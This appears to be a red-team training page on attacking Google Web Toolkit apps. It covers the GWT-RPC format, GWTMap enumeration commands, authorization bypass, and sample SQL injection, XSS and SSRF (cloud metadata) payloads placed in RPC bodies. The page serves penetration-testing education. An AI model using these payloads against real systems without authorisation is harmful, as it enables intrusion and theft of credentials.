---
layout: training-page
title: "Google Web Toolkit (GWT) Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - gwt
  - java
  - rpc
  - web
  - serialization
page_key: "web-gwt-injection"
render_with_liquid: false
---

# Google Web Toolkit (GWT) Injection

Google Web Toolkit (GWT) is an open-source framework that lets developers write Java code that compiles to JavaScript front-end applications. GWT applications communicate with the server using the GWT-RPC protocol — a proprietary serialization format. Attacking GWT requires first enumerating the available RPC services and methods from the compiled JavaScript (permutations), then crafting and probing RPC payloads.

## GWT Architecture Overview

A GWT application loads a bootstrap file (`*.nocache.js`) which selects one of several compiled permutations (`*.cache.js`) based on the client's browser and locale. All service method signatures and serialized types are embedded in the permutation files. These files are typically served unminified or with predictable naming.

## Identifying GWT Applications

- Look for `*.nocache.js` in page source or network traffic
- Check for `*.cache.js` files loaded by the page
- HTTP requests to `/rpc` or similar paths with `Content-Type: text/x-gwt-rpc; charset=utf-8`
- Response bodies starting with `//OK` (success) or `//EX` (exception)

## Methodology with GWTMap

### Enumerate Methods from Bootstrap File

```
# Download bootstrap, select a permutation at random, and create a local backup
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --backup
```

### Enumerate from a Specific Permutation

```
./gwtmap.py -u http://10.10.10.10/olympian/C39AB19B83398A76A21E0CD04EC9B14C.cache.js
```

### Enumerate via HTTP Proxy (Burp Suite)

```
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --backup -p http://127.0.0.1:8080
```

### Enumerate from a Local Permutation File

```
./gwtmap.py -F test_data/olympian/C39AB19B83398A76A21E0CD04EC9B14C.cache.js
```

### Filter to a Specific Service or Method

```
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter AuthenticationService.login
```

### Generate RPC Payloads

```
# Generate RPC payloads for all methods in a service
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter AuthenticationService --rpc --color
```

### Probe the Generated RPC Request

```
# Automatically send the generated RPC request and check the response
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter AuthenticationService.login --rpc --probe
./gwtmap.py -u http://10.10.10.10/olympian/olympian.nocache.js --filter TestService.testDetails --rpc --probe
```

## GWT-RPC Request Format

GWT-RPC requests are POST requests to the service endpoint with a pipe-delimited body. Understanding the format allows manual crafting and fuzzing in Burp Suite:

```
POST /olympian/rpc HTTP/1.1
Host: 10.10.10.10
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Permutation: C39AB19B83398A76A21E0CD04EC9B14C
X-GWT-Module-Base: http://10.10.10.10/olympian/

7|0|6|http://10.10.10.10/olympian/|HASH|com.example.client.AuthenticationService|login|java.lang.String/2004016611|java.lang.String/2004016611|admin|password|1|2|3|4|2|5|6|
```

Fields: `version|flags|string_table_length|module_base|policy_hash|service_interface|method|param_types...|param_values...|call_id`

## Vulnerability Classes in GWT Applications

### Insecure Deserialization / EL Injection

GWT-RPC deserializes Java objects on the server. If deserialization logic uses Expression Language (EL) or invokes gadget chains, RCE is possible via crafted type payloads. Research by Steven Seeley demonstrated chaining GWT deserialization with EL injection for RCE.

### Authorization Bypass via Direct Service Calls

GWT services may lack server-side authorization checks, assuming only the compiled front-end can call them. By enumerating methods and crafting raw RPC requests, attackers can invoke admin-only methods directly.

### Enumeration of Hidden Services

Services registered in the permutation but not linked in the visible UI are still callable. GWTMap reveals all registered services regardless of UI visibility.

---

## GWT Serialization Format Deep-Dive

### How GWT-RPC Works

GWT-RPC is a custom binary-over-text serialization protocol. When the GWT front-end calls a remote service method, it serializes the call into a pipe-delimited string and POSTs it to the `/rpc` endpoint (or whatever path the service is registered at). The server deserializes the request, invokes the method, serializes the return value, and returns it.

The format breaks down as:

```
version | flags | string_table_size | string_1 | string_2 | ... | string_N | index_references
```

A concrete example for calling `AuthenticationService.login("admin", "password")`:

```
7|0|7|http://target.com/app/|ABC123DEF456|com.example.client.rpc.AuthenticationService|login|java.lang.String/2004016611|admin|password|1|2|3|4|2|5|6|7|
```

Breaking it down field by field:

| Position | Value | Meaning |
| --- | --- | --- |
| 1 | `7` | RPC protocol version |
| 2 | `0` | Flags (0 = normal) |
| 3 | `7` | Number of strings in the string table |
| 4 | `http://target.com/app/` | Module base URL |
| 5 | `ABC123DEF456` | Strong policy name (permutation hash) |
| 6 | `com.example.client.rpc.AuthenticationService` | Service interface fully qualified name |
| 7 | `login` | Method name |
| 8 | `java.lang.String/2004016611` | Parameter type (type hash) |
| 9 | `admin` | Parameter value 1 |
| 10 | `password` | Parameter value 2 |
| 11+ | Index refs | Back-references into the string table |

### Magic String — Policy File Hash

The `strong policy name` (position 5) is a hash of the serialization policy file. GWT generates `.gwt.rpc` policy files that list all serializable types. These files are served at a predictable path:

```
http://target.com/app/ABC123DEF456.gwt.rpc
```

Fetching the policy file reveals all types the server will accept for deserialization — a roadmap for crafting payloads.

---

## Identifying GWT Endpoints

### HTTP Traffic Indicators

Look in Burp's HTTP history for:

```
Content-Type: text/x-gwt-rpc; charset=utf-8
X-GWT-Module-Base: ...
X-GWT-Permutation: ...
```

Responses starting with:

```
//OK[...]     -- successful response
//EX[...]     -- exception response (reveals Java class names, stack traces)
```

### Source Code Discovery

View the page source and look for script includes:

```html
<script src="app/app.nocache.js"></script>
```

The `.nocache.js` file contains the permutation selection logic. Multiple `.cache.js` files are loaded conditionally.

### Common GWT Endpoint Paths

```
/rpc
/service
/gwt/rpc
/api/rpc
/app.rpc
```

---

## Deserializing and Re-Serializing GWT Requests in Burp

### Burp GWT Plugin (GDSSecurity Toolset)

The GWT Penetration Testing Toolset from GDSSecurity provides a Burp extension that:
- Converts GWT-RPC requests to a readable format in the Burp editor
- Allows editing parameter values in plain text
- Re-serializes the modified request transparently

Installation:
1. Download the GWT Burp plugin from `github.com/GDSSecurity/GWT-Penetration-Testing-Toolset`
2. In Burp: Extender → Extensions → Add → select the JAR
3. GWT requests in Proxy/Repeater now show a "GWT" tab with decoded content

### Manual Burp Approach Without Plugin

1. Intercept a GWT-RPC request in Burp Proxy.
2. Send to Repeater.
3. In the raw request body, the string table entries are positional — identify the parameter values by their position in the `|`-delimited format.
4. Replace parameter values directly in the raw body.
5. Adjust string table indexes at the end if you add/remove strings (changing string count in position 3 and updating back-references).

---

## Injecting Payloads into GWT Parameters

GWT string parameters are injected directly into the pipe-delimited string table. If the server-side code passes a GWT string parameter to a database query, template, or system call without sanitization, standard payloads apply.

### SQL Injection in GWT String Parameter

Original legitimate request:

```
7|0|5|http://target.com/app/|HASH|com.app.rpc.UserService|getUser|java.lang.String/2004016611|john|1|2|3|4|1|5|
```

SQLi payload replacing the username parameter:

```
7|0|5|http://target.com/app/|HASH|com.app.rpc.UserService|getUser|java.lang.String/2004016611|' OR '1'='1|1|2|3|4|1|5|
```

Time-based blind SQLi:

```
7|0|5|http://target.com/app/|HASH|com.app.rpc.UserService|getUser|java.lang.String/2004016611|' AND SLEEP(5)-- -|1|2|3|4|1|5|
```

### XSS in GWT String Parameter

If the return value from a GWT call is reflected into the DOM:

```
7|0|5|http://target.com/app/|HASH|com.app.rpc.SearchService|search|java.lang.String/2004016611|<img src=x onerror=alert(1)>|1|2|3|4|1|5|
```

### SSRF in GWT String Parameter

If the service makes an outbound HTTP request based on a string parameter:

```
7|0|5|http://target.com/app/|HASH|com.app.rpc.FeedService|loadFeed|java.lang.String/2004016611|http://169.254.169.254/latest/meta-data/|1|2|3|4|1|5|
```

---

## GWT Policy File Information Disclosure

The `.gwt.rpc` policy file lists every type that can be serialized and deserialized:

```
# Fetch the policy file using the hash from the RPC request
curl http://target.com/app/ABC123DEF456.gwt.rpc
```

Example policy file content:

```
com.example.shared.UserData, false, true, com.example.shared.UserData/1234567890, ...
com.example.shared.AdminData, false, true, com.example.shared.AdminData/9876543210, ...
java.lang.String, false, true, java.lang.String/2004016611, ...
```

The policy file reveals:
- All Java classes involved in RPC (including admin/internal ones not visible in the UI)
- Type hash values needed for crafting serialized payloads
- Potentially sensitive package names and class hierarchies

---

## Detection in HTTP Traffic — Quick Reference

Signatures for detecting GWT applications during recon:

```
# Request signatures
Content-Type: text/x-gwt-rpc
X-GWT-Module-Base
X-GWT-Permutation

# URL patterns
*.nocache.js
*.cache.js
*.gwt.rpc
/rpc (POST with pipe-delimited body)

# Response signatures
//OK[
//EX[
com.google.gwt.user.client.rpc.IncompatibleRemoteServiceException
```

---

## Tools

- [FSecureLABS/GWTMap](https://github.com/FSecureLABS/GWTMap) — Map the attack surface of GWT applications, generate and probe RPC payloads
- [GDSSecurity/GWT-Penetration-Testing-Toolset](https://github.com/GDSSecurity/GWT-Penetration-Testing-Toolset) — Tools for intercepting and manipulating GWT-RPC traffic

## Resources

- From Serialized to Shell: Exploiting GWT with EL Injection — Steven Seeley — `srcincite.io/blog/2017/05/22/from-serialized-to-shell-auditing-google-web-toolkit-with-el-injection.html`
- Hacking a Google Web Toolkit Application — thehackerish — `thehackerish.com/hacking-a-google-web-toolkit-application/`
- GWT-RPC Wire Protocol — Google Developer Documentation — `gwtproject.org/doc/latest/DevGuideServerCommunication.html`
- Pentesting GWT — HackTricks — `book.hacktricks.xyz/pentesting-web/gwt-google-web-toolkit`
- GWT Security Considerations — OWASP — `owasp.org`
